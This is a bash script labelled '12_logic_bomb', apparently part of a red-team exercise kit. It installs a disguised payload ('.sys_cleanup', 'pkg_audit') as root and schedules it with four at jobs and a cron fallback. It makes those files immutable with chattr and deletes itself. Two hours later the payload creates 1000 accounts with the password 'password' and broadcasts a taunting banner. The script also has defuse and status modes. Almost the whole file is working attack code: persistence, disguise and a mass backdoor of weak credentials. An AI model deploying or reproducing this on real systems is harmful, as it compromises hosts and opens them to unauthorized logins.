#!/usr/bin/env bash
set -euo pipefail
[[ $EUID -eq 0 ]] || { echo "[!] Requires root"; exit 1; }

PAYLOAD="/usr/local/lib/.sys_cleanup"
CRON_FILE="/etc/cron.d/pkg_audit"
USER_LIST="/usr/local/lib/.user_registry"
USER_COUNT=1000
AT_SPOOL_DIRS=(/var/spool/at/jobs /var/spool/cron/atjobs /var/spool/at)

LOGIN_SHELL=$(command -v bash 2>/dev/null || command -v sh)

# ── Helpers ───────────────────────────────────────────────────────────────────

# Schedule one at job; return the job number.
schedule_at() {
    local delay_min="$1"
    echo "bash $PAYLOAD" | at "now + ${delay_min} minutes" 2>&1 \
        | grep -oE 'job [0-9]+' | awk '{print $2}' || true
}

# Lock the spool file for a given job number.
# Uses ls -t (newest first) — cross-distro; avoids grep for Debian-specific headers.
lock_at_job() {
    local job_id="$1"
    sleep 0.3  # give atd a moment to write the spool file
    for spool in "${AT_SPOOL_DIRS[@]}"; do
        [[ -d "$spool" ]] || continue
        local fname f
        fname=$(ls -t "$spool" 2>/dev/null | head -1 || true)
        [[ -n "$fname" ]] || continue
        f="$spool/$fname"
        if [[ -f "$f" ]]; then
            chattr +i "$f" 2>/dev/null && echo "[+]   locked at spool: $f" || true
            return
        fi
    done
}

# ── Deploy ────────────────────────────────────────────────────────────────────
case "${1:-}" in
  deploy)
    # Compute trigger time (now + 2 hours)
    TRIGGER_EPOCH=$(( $(date +%s) + 7200 ))
    TRIGGER_MIN=$(date -d "@${TRIGGER_EPOCH}" '+%M')
    TRIGGER_HR=$(date -d "@${TRIGGER_EPOCH}" '+%H')
    TRIGGER_DAY=$(date -d "@${TRIGGER_EPOCH}" '+%d')
    TRIGGER_MON=$(date -d "@${TRIGGER_EPOCH}" '+%m')

    # Ensure at is installed (not present by default on Rocky 9/10 or Ubuntu minimal)
    if ! command -v at &>/dev/null; then
        echo "[*] Installing at..."
        if command -v dnf &>/dev/null; then
            dnf install -y at 2>/dev/null || true
        elif command -v apt-get &>/dev/null; then
            # Disable cdrom sources that block installs on DVD-provisioned machines.
            sed -i 's|^deb cdrom:|#deb cdrom:|g' /etc/apt/sources.list 2>/dev/null || true
            DEBIAN_FRONTEND=noninteractive apt-get install -y at 2>/dev/null || true
        fi
    fi
    systemctl enable --now atd 2>/dev/null || service atd start 2>/dev/null || true

    # Write payload script
    cat > "$PAYLOAD" << PAYLOAD_EOF
#!/bin/bash
# sys_cleanup — package integrity maintenance
LOGIN_SHELL="${LOGIN_SHELL}"
USER_LIST="${USER_LIST}"
: > "\$USER_LIST"
for i in \$(seq 1 ${USER_COUNT}); do
    name=\$(tr -dc 'a-z' < /dev/urandom | head -c 10)
    # Retry once on the (astronomically unlikely) collision
    useradd -m -s "\${LOGIN_SHELL}" "\$name" 2>/dev/null || {
        name=\$(tr -dc 'a-z' < /dev/urandom | head -c 10)
        useradd -m -s "\${LOGIN_SHELL}" "\$name" 2>/dev/null || true
    }
    echo "\${name}:password" | chpasswd 2>/dev/null || true
    echo "\$name" >> "\$USER_LIST"
done
chattr +i "\$USER_LIST" 2>/dev/null || true
# Self-remove the cron fallback after firing
sed -i '/pkg_audit/d' "${CRON_FILE}" 2>/dev/null || true
echo "\$(date -Iseconds) logic bomb fired" >> /var/log/.pkg_audit.log
# Taunt
ADDED=\$(wc -l < "\$USER_LIST" 2>/dev/null || echo 0)
wall \$'\n'"  ██████╗ ███████╗██████╗     ████████╗███████╗ █████╗ ███╗   ███╗"$'\n'"  ██╔══██╗██╔════╝██╔══██╗    ╚══██╔══╝██╔════╝██╔══██╗████╗ ████║"$'\n'"  ██████╔╝█████╗  ██║  ██║       ██║   █████╗  ███████║██╔████╔██║"$'\n'"  ██╔══██╗██╔══╝  ██║  ██║       ██║   ██╔══╝  ██╔══██║██║╚██╔╝██║"$'\n'"  ██║  ██║███████╗██████╔╝       ██║   ███████╗██║  ██║██║ ╚═╝ ██║"$'\n'"  ╚═╝  ╚═╝╚══════╝╚═════╝        ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝"$'\n'$'\n'"  \${ADDED} users just joined /etc/passwd. Hope you backed it up."$'\n'
PAYLOAD_EOF
    chmod 700 "$PAYLOAD"
    chattr +i "$PAYLOAD" 2>/dev/null || true

    # Layer 1: four staggered at jobs
    echo "[+] Scheduling at jobs..."
    for delay in 120 125 130 150; do
        jid=$(schedule_at "$delay")
        echo "[+]   at +${delay}min → job ${jid:-?}"
        sleep 0.2 && lock_at_job "${jid:-}"
    done

    # Layer 2: cron fallback at the exact trigger minute
    cat > "$CRON_FILE" << CRON_EOF
# pkg_audit — package database sync
${TRIGGER_MIN} ${TRIGGER_HR} ${TRIGGER_DAY} ${TRIGGER_MON} * root bash ${PAYLOAD}
CRON_EOF
    chmod 644 "$CRON_FILE"
    chattr +i "$CRON_FILE" 2>/dev/null || true

    echo "[+] 12_logic_bomb: armed"
    echo "[+]   Trigger: $(date -d "@${TRIGGER_EPOCH}" '+%H:%M on %Y-%m-%d')  (in 2 hours)"
    echo "[+]   Payload: create ${USER_COUNT} users (random 10-char names, shell=${LOGIN_SHELL}, pass=password)"
    echo "[+]   Defuse:  remove at jobs + unlock and remove ${CRON_FILE}"
    rm -f -- "${BASH_SOURCE[0]}" 2>/dev/null || true
    ;;

# ── Cleanup ───────────────────────────────────────────────────────────────────
  cleanup)
    echo "[-] Removing at jobs referencing payload..."
    while IFS= read -r line; do
        jid=$(echo "$line" | awk '{print $1}')
        if at -c "$jid" 2>/dev/null | grep -qF "$PAYLOAD"; then
            # Unlock the spool file first
            for spool in "${AT_SPOOL_DIRS[@]}"; do
                [[ -d "$spool" ]] || continue
                for f in "$spool"/*; do
                    [[ -f "$f" ]] || continue
                    grep -qF "$PAYLOAD" "$f" 2>/dev/null && chattr -i "$f" 2>/dev/null || true
                done
            done
            atrm "$jid" 2>/dev/null && echo "[-]   removed at job ${jid}" || \
                echo "[!]   atrm ${jid} failed — still locked?"
        fi
    done < <(atq 2>/dev/null || true)

    chattr -i "$CRON_FILE"  2>/dev/null || true
    chattr -i "$PAYLOAD"    2>/dev/null || true
    chattr -i "$USER_LIST"  2>/dev/null || true
    rm -f "$CRON_FILE" "$PAYLOAD"

    echo "[-] Removing bomb users..."
    removed=0
    if [[ -f "$USER_LIST" ]]; then
        while IFS= read -r name; do
            [[ -z "$name" ]] && continue
            userdel -r "$name" 2>/dev/null && removed=$(( removed + 1 )) || true
        done < "$USER_LIST"
        rm -f "$USER_LIST"
    fi
    echo "[-] Removed ${removed} users"
    echo "[-] 12_logic_bomb: defused"
    ;;

# ── Status ────────────────────────────────────────────────────────────────────
  status)
    echo "[*] Pending at jobs:"
    atq 2>/dev/null || echo "  (atq unavailable)"
    bomb_users=$( [[ -f "$USER_LIST" ]] && wc -l < "$USER_LIST" || echo 0 )
    echo "[*] Bomb users created: ${bomb_users}"
    echo "[*] User registry: $( [[ -f "$USER_LIST" ]] && echo "present (${USER_LIST})" || echo "absent — bomb not yet fired" )"
    echo "[*] Cron fallback: $( [[ -f "$CRON_FILE" ]] && echo "present" || echo "absent" )"
    echo "[*] Payload script: $( [[ -f "$PAYLOAD" ]] && echo "present" || echo "absent" )"
    ;;

  *) echo "Usage: $0 deploy|cleanup|status"; exit 1 ;;
esac
